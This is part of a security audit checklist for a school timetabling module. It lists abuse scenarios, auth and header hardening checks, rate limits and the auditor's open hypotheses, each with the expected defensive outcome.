### 16.3 Substitution / offer abuse

| #           | Scenario                                                                                       | Expected                                            | Severity | Pass/Fail |
| ----------- | ---------------------------------------------------------------------------------------------- | --------------------------------------------------- | -------- | --------- |
| SCH-SEC-508 | Teacher accepts offer, then cancels own absence (revoking record); then declines retroactively | Decline 409 OFFER_REVOKED                           | P1       |           |
| SCH-SEC-509 | Two teachers race to accept same offer                                                         | One 200, one 409 ALREADY_ACCEPTED                   | P0       |           |
| SCH-SEC-510 | Self-report absence with `nominated_substitute = self`                                         | 422 CANNOT_NOMINATE_SELF                            | P1       |           |
| SCH-SEC-511 | Self-report absence with `nominated_substitute = <known unavailable colleague>`                | 200 (cascade handles); offer eventually escalates   | P2       |           |
| SCH-SEC-512 | Admin assigns substitute to a slot the substitute is already teaching (conflict)               | 409 SUB_HAS_CONFLICT or warning + override required | P1       |           |
| SCH-SEC-513 | Mass-spam offers: trigger 1,000 absences in 1 minute (admin)                                   | Rate-limit; cascade backpressure                    | P1       |           |
| SCH-SEC-514 | Cancel absence → revokeOffersForAbsence; verify zero pending offers remain in DB               | Verified                                            | P0       |           |

### 16.4 Pin / unpin abuse

| #           | Scenario                                                                 | Expected                                                               | Severity | Pass/Fail |
| ----------- | ------------------------------------------------------------------------ | ---------------------------------------------------------------------- | -------- | --------- |
| SCH-SEC-515 | Pin every schedule entry; trigger solver run                             | Solver completes immediately (no degrees of freedom); no infinite loop | P1       |           |
| SCH-SEC-516 | Pin with deeply nested `pin_reason` JSON (string field, but JSON-shaped) | Stored as string verbatim                                              | P2       |           |
| SCH-SEC-517 | Bulk-pin 100,000 schedules → server should refuse                        | 422 or 413                                                             | P1       |           |
| SCH-SEC-518 | Pin a schedule that doesn't exist (deleted in another tx)                | 404                                                                    | P1       |           |
| SCH-SEC-519 | Unpin schedule then immediately pin it (race)                            | Both succeed sequentially; final state = pinned                        | P2       |           |

### 16.5 Calendar token abuse

| #           | Scenario                                                              | Expected                                           | Severity | Pass/Fail |
| ----------- | --------------------------------------------------------------------- | -------------------------------------------------- | -------- | --------- |
| SCH-SEC-520 | Hammer .ics endpoint with one valid token at 1,000 req/sec            | 429 after threshold; bucket per token              | P1       |           |
| SCH-SEC-521 | Create 1,000 calendar tokens for same teacher                         | 422 max-tokens-per-entity OR 200 (document policy) | P2       |           |
| SCH-SEC-522 | Calendar token survives entity (teacher) deletion                     | Subsequent .ics → 404 or empty calendar            | P1       |           |
| SCH-SEC-523 | Calendar token returns iCal containing other-tenant data via JOIN bug | Verified: only own tenant rows in output           | P0       |           |

### 16.6 Exam scheduling abuse

| #           | Scenario                                                   | Expected                                    | Severity | Pass/Fail |
| ----------- | ---------------------------------------------------------- | ------------------------------------------- | -------- | --------- |
| SCH-SEC-524 | Publish exam session with zero slots                       | 422 or success-with-warning                 | P2       |           |
| SCH-SEC-525 | Generate exam schedule for session with insufficient rooms | Failure with diagnostic; no partial publish | P1       |           |
| SCH-SEC-526 | Assign invigilator who is also exam candidate              | 422 INVALID_INVIGILATOR or warning          | P1       |           |
| SCH-SEC-527 | PUT exam session after publish to reduce date range        | 409 PUBLISHED_IMMUTABLE                     | P0       |           |
| SCH-SEC-528 | Delete exam session that has invigilation assignments      | Cascade or 409 HAS_DEPENDENCIES             | P1       |           |

### 16.7 Cross-feature abuse

| #           | Scenario                                                                       | Expected                                                             | Severity | Pass/Fail |
| ----------- | ------------------------------------------------------------------------------ | -------------------------------------------------------------------- | -------- | --------- |
| SCH-SEC-529 | Apply scheduling run that overwrites manually-pinned schedules                 | Pinned entries respected (solver assemble reads pins as constraints) | P0       |           |
| SCH-SEC-530 | Emergency change creates conflict with existing schedule (teacher double-book) | Conflict detected; user warned but can proceed (documented)          | P1       |           |
| SCH-SEC-531 | Swap two schedules where one is pinned                                         | 409 CANNOT_SWAP_PINNED OR allowed with warning                       | P1       |           |
| SCH-SEC-532 | Apply scheduling run for academic year that's been archived                    | 409 ACADEMIC_YEAR_ARCHIVED                                           | P1       |           |

---

## 17. Encrypted / Sensitive Field Round-Trip

Per inventory §4, the Scheduling module has **no encrypted fields at the application layer** (no `pgcrypto`, no AES-256, no Stripe/bank/secrets). Verify this remains true and that nothing sensitive lives in plaintext columns by mistake.

### 17.1 Plaintext-only verification

| #           | Assertion                                                                                                                                                                                                                     | Expected                                      | Severity         | Pass/Fail                                                                                                     |
| ----------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------- | ---------------- | ------------------------------------------------------------------------------------------------------------- | ------------ | --- | --- |
| SCH-SEC-533 | `grep -rn 'encrypt\\                                                                                                                                                                                                          | decrypt\\                                     | cipher\\         | aes-256' apps/api/src/modules/scheduling apps/api/src/modules/schedules apps/api/src/modules/scheduling-runs` | Zero matches | P1  |     |
| SCH-SEC-534 | `grep -rn 'pgp_sym\\                                                                                                                                                                                                          | crypt(' packages/prisma/migrations            | grep -i schedul` | Zero matches                                                                                                  | P1           |     |
| SCH-SEC-535 | DB column scan: `SELECT column_name FROM information_schema.columns WHERE table_schema='public' AND column_name LIKE '%password%' OR column_name LIKE '%secret%' OR column_name LIKE '%key%' AND table_name LIKE '%schedul%'` | Empty (no secret cols leaked into scheduling) | P0               |                                                                                                               |
| SCH-SEC-536 | `pin_reason`, `cancellation_reason`, `failure_reason` MUST NOT contain stored payment / SSN / passport data — log scan for accidental capture                                                                                 | Reviewed                                      | P1               |                                                                                                               |
| SCH-SEC-537 | `result_json` JSONB MUST NOT contain user emails, phone numbers, addresses, passport/visa info — solver only operates on IDs                                                                                                  | Verified — schema review of types-v3.ts       | P0               |                                                                                                               |
| SCH-SEC-538 | `config_snapshot` MUST NOT contain user PII — same rule                                                                                                                                                                       | Verified                                      | P0               |                                                                                                               |
| SCH-SEC-539 | iCal output `.ics` includes teacher name + class name only (no sensitive data)                                                                                                                                                | Verified                                      | P1               |                                                                                                               |
| SCH-SEC-540 | iCal output does NOT include student names (privacy)                                                                                                                                                                          | Verified                                      | P0               |                                                                                                               |

### 17.2 Calendar token treatment as sensitive

| #           | Assertion                                                                                                    | Expected                                        | Severity | Pass/Fail |
| ----------- | ------------------------------------------------------------------------------------------------------------ | ----------------------------------------------- | -------- | --------- |
| SCH-SEC-541 | Calendar token NOT logged in plain (no `logger.info(token)` anywhere)                                        | Verified                                        | P0       |           |
| SCH-SEC-542 | Calendar token NOT echoed in error messages                                                                  | Verified                                        | P0       |           |
| SCH-SEC-543 | Calendar token visible to user once on creation, can be re-fetched via `GET /v1/scheduling/calendar-tokens`? | Document policy — full token returned vs masked | P2       |           |

---

## 18. Auth Hardening

### 18.1 JWT lifecycle on long-running solver scenarios

| #           | Scenario                                                                               | Expected                                                                                                                           | Severity | Pass/Fail |
| ----------- | -------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- | -------- | --------- |
| SCH-SEC-544 | User triggers solver run; JWT expires while polling progress; user has refresh token   | UI auto-refreshes; poll resumes; no run interruption                                                                               | P0       |           |
| SCH-SEC-545 | Solver run lasts 60 min; JWT TTL 15 min; user closes browser at minute 5               | Worker continues server-side; user sees completed run on next login                                                                | P0       |           |
| SCH-SEC-546 | User triggers run, immediately logs out, then logs in as different user in same tenant | New user can see/manage the run (tenant-scoped, not user-scoped, except apply audit)                                               | P1       |           |
| SCH-SEC-547 | User's permissions revoked while solver run is in flight                               | Worker continues; user can no longer read/apply                                                                                    | P1       |           |
| SCH-SEC-548 | User's account deleted while solver run is in flight                                   | Worker continues (uses tenant_id, not user_id); run completes; on apply, system uses system-user sentinel for `applied_by_user_id` | P1       |           |

### 18.2 Logout / session invalidation

| #           | Scenario                                                                      | Expected                 | Severity | Pass/Fail |
| ----------- | ----------------------------------------------------------------------------- | ------------------------ | -------- | --------- |
| SCH-SEC-549 | POST /v1/auth/logout → refresh token immediately invalidated                  | Subsequent refresh → 401 | P0       |           |
| SCH-SEC-550 | Access JWT remains valid until expiry post-logout (documented)                | Documented limit         | P1       |           |
| SCH-SEC-551 | Logout from device A → device B's session remains valid (per-device sessions) | Verified                 | P1       |           |
| SCH-SEC-552 | "Log out everywhere" → ALL refresh tokens invalidated for user                | Verified                 | P1       |           |

### 18.3 Refresh-token rotation

| #           | Scenario                                                                       | Expected                       | Severity | Pass/Fail |
| ----------- | ------------------------------------------------------------------------------ | ------------------------------ | -------- | --------- |
| SCH-SEC-553 | Refresh token is single-use; second use of same RT → entire family invalidated | Verified                       | P1       |           |
| SCH-SEC-554 | Stolen RT reuse triggers Sentry alert (suspicious activity)                    | Verified                       | P1       |           |
| SCH-SEC-555 | RT rotation produces new RT in httpOnly Secure SameSite=Strict cookie          | Verified via header inspection | P1       |           |
| SCH-SEC-556 | RT TTL ≤ 30 days (documented)                                                  | Verified                       | P2       |           |

### 18.4 MFA gating (forward-looking — currently flagged)

| #           | Scenario                                                                        | Expected                                        | Severity | Pass/Fail |
| ----------- | ------------------------------------------------------------------------------- | ----------------------------------------------- | -------- | --------- |
| SCH-SEC-557 | Solver `apply` requires MFA-step-up if user hasn't presented MFA in last 30 min | Currently NOT enforced — flag as P2 enhancement | P2       |           |
| SCH-SEC-558 | Emergency-change requires MFA-step-up                                           | Currently NOT enforced — flag as P2             | P2       |           |
| SCH-SEC-559 | Pin a critical schedule (specific class) requires MFA — N/A currently           | Document decision                               | P3       |           |

---

## 19. HTTP Hardening Headers

| #           | Header                                                                                          | Expected value                                                                           | Severity | Pass/Fail |
| ----------- | ----------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------- | -------- | --------- |
| SCH-SEC-560 | `Strict-Transport-Security`                                                                     | `max-age=31536000; includeSubDomains; preload`                                           | P0       |           |
| SCH-SEC-561 | `X-Content-Type-Options`                                                                        | `nosniff`                                                                                | P1       |           |
| SCH-SEC-562 | `X-Frame-Options`                                                                               | `DENY` (or CSP `frame-ancestors 'none'`)                                                 | P1       |           |
| SCH-SEC-563 | `Content-Security-Policy`                                                                       | Restrictive: `default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'` | P1       |           |
| SCH-SEC-564 | `Referrer-Policy`                                                                               | `strict-origin-when-cross-origin` or stricter                                            | P2       |           |
| SCH-SEC-565 | `Permissions-Policy`                                                                            | Disable unused: `camera=(), microphone=(), geolocation=()`                               | P2       |           |
| SCH-SEC-566 | `Cross-Origin-Opener-Policy`                                                                    | `same-origin`                                                                            | P2       |           |
| SCH-SEC-567 | `Cross-Origin-Embedder-Policy`                                                                  | `require-corp` (where compatible)                                                        | P3       |           |
| SCH-SEC-568 | `X-Powered-By`                                                                                  | absent or non-revealing                                                                  | P2       |           |
| SCH-SEC-569 | `.ics` endpoint sets `Content-Type: text/calendar; charset=utf-8`                               | Verified                                                                                 | P2       |           |
| SCH-SEC-570 | `.ics` endpoint sets `Content-Disposition: attachment; filename="..."` to prevent inline render | Verified                                                                                 | P2       |           |
| SCH-SEC-571 | All API responses set `Cache-Control: no-store` for authenticated routes                        | Verified                                                                                 | P1       |           |

---

## 20. Rate Limiting & DoS Surface

| #           | Endpoint                                                                               | Limit                                                    | Burst | Expected on breach          | Severity | Pass/Fail |
| ----------- | -------------------------------------------------------------------------------------- | -------------------------------------------------------- | ----- | --------------------------- | -------- | --------- |
| SCH-SEC-572 | POST /v1/scheduling-runs                                                               | 10/min/tenant                                            | 3     | 429                         | P1       |           |
| SCH-SEC-573 | POST /v1/scheduling/scenarios/:id/solve                                                | 10/min/tenant                                            | 3     | 429                         | P1       |           |
| SCH-SEC-574 | POST /v1/scheduling-runs/:id/apply                                                     | 5/min/tenant                                             | 2     | 429                         | P1       |           |
| SCH-SEC-575 | POST /v1/scheduling/swaps/execute                                                      | 60/min/tenant                                            | 10    | 429                         | P2       |           |
| SCH-SEC-576 | POST /v1/scheduling/emergency-change                                                   | 30/min/tenant                                            | 5     | 429                         | P2       |           |
| SCH-SEC-577 | POST /v1/scheduling/absences                                                           | 60/min/tenant                                            | 10    | 429                         | P2       |           |
| SCH-SEC-578 | POST /v1/scheduling/absences/self-report                                               | 5/min/user                                               | 2     | 429                         | P2       |           |
| SCH-SEC-579 | POST /v1/scheduling/offers/:id/accept                                                  | 30/min/user                                              | 10    | 429                         | P2       |           |
| SCH-SEC-580 | GET /v1/calendar/:tenantId/:token.ics                                                  | 60/min/token                                             | 10    | 429                         | P1       |           |
| SCH-SEC-581 | GET /v1/scheduling-runs/:id/progress (polling)                                         | 60/min/user                                              | 10    | 429                         | P2       |           |
| SCH-SEC-582 | POST /v1/scheduling/curriculum-requirements/bulk-upsert                                | 10/min/tenant                                            | 3     | 429                         | P2       |           |
| SCH-SEC-583 | POST /v1/scheduling/teacher-competencies/bulk                                          | 10/min/tenant                                            | 3     | 429                         | P2       |           |
| SCH-SEC-584 | DoS: solver sidecar with malicious config_snapshot                                     | Solver self-protects with timeout; queue 1-concurrency   | —     | failure_reason=TIMEOUT      | P1       |           |
| SCH-SEC-585 | Worker ingests 10,000 messages in 1 sec on `scheduling` queue                          | BullMQ buffers; concurrency=1 ⇒ serial; SLA breach alert | —     | Sentry alert                | P1       |           |
| SCH-SEC-586 | Postgres connection pool exhaustion via parallel scheduling reads (1,000 simultaneous) | PgBouncer queues; no 5xx                                 | —     | 503 only on extreme exhaust | P2       |           |

---

## 21. Severity Tally

Placeholder counts (auditor fills as findings discovered).

| Severity | Definition                                                                 | Count |
| -------- | -------------------------------------------------------------------------- | ----- |
| P0       | Critical — exploitable to leak/destroy cross-tenant data, RCE, auth bypass | 0     |
| P1       | High — exploitable for tenant-internal damage, or P0 under unlikely chain  | 0     |
| P2       | Medium — defence-in-depth weakness or audit-noise                          | 0     |
| P3       | Low — cosmetic / accepted-risk / out-of-scope-by-policy                    | 0     |
| Total    |                                                                            | 0     |

**Release gate:** Zero P0, zero unmitigated P1, all P2 with documented compensating control or accepted-risk sign-off.

---

## 22. Observations & Gaps Spotted

(Auditor fills during execution. Pre-execution hypotheses to verify or refute:)

1. **Calendar tokens are bearer-only** — a leaked `.ics` URL grants permanent read access to a teacher's or class's full timetable, potentially indefinitely. There is no expiry, no rotation, and no ability to detect compromise (no audit log of `.ics` fetches by default per inventory). Recommend: 90-day expiry, per-user max token count, optional usage logging behind feature flag.

2. **`POST /v1/scheduling-runs` and `apply` are not MFA-gated** — these are the highest-blast-radius actions in the module (overwrites the timetable for thousands of students). On a compromised admin account, an attacker can produce and apply a hostile schedule in <30 seconds. Recommend: MFA-step-up on `apply` if MFA not presented in last 30 min.

3. **`tenant_scheduling_settings.max_solver_duration` is operator-controlled** — if any endpoint allows tenant-side modification of this, a tenant can starve worker capacity for itself (and via concurrency=1 queue, indirectly for others). Verify a hard ceiling exists in code, not just in admin UI.

4. **Solver sidecar (`SOLVER_PY_URL`) and worker share a single host per inventory** — if solver is compromised (e.g., OR-Tools advisory), it has access to whatever the worker has. Document network segmentation.

5. **`scheduling:reap-stale-runs` cron iterates "all active tenants"** — verify this iteration sets RLS context per tenant and never bulk-queries across tenants without a tenant filter.

6. **iCal generator output (RFC 5545) needs special-character escaping** — names with commas, semicolons, or newlines can break the .ics format and potentially inject events. Verify property-value escape is per spec.

7. **`/v1/scheduling/substitution-board` is described in inventory as "Public/Staff" with `apiClient calls (no auth check)`** — clarify whether this is truly anonymous or requires a session. If anonymous, then it leaks today's absent staff names to any visitor.

---

## 23. Sign-off

| Role                              | Name | Date | Signature |
| --------------------------------- | ---- | ---- | --------- |
| Security engineer                 |      |      |           |
| Engineering lead                  |      |      |           |
| Tenant rep (if external pen-test) |      |      |           |
| Release manager                   |      |      |           |

**Release decision:** PASS / FAIL / CONDITIONAL (note conditions below)

Notes:

---
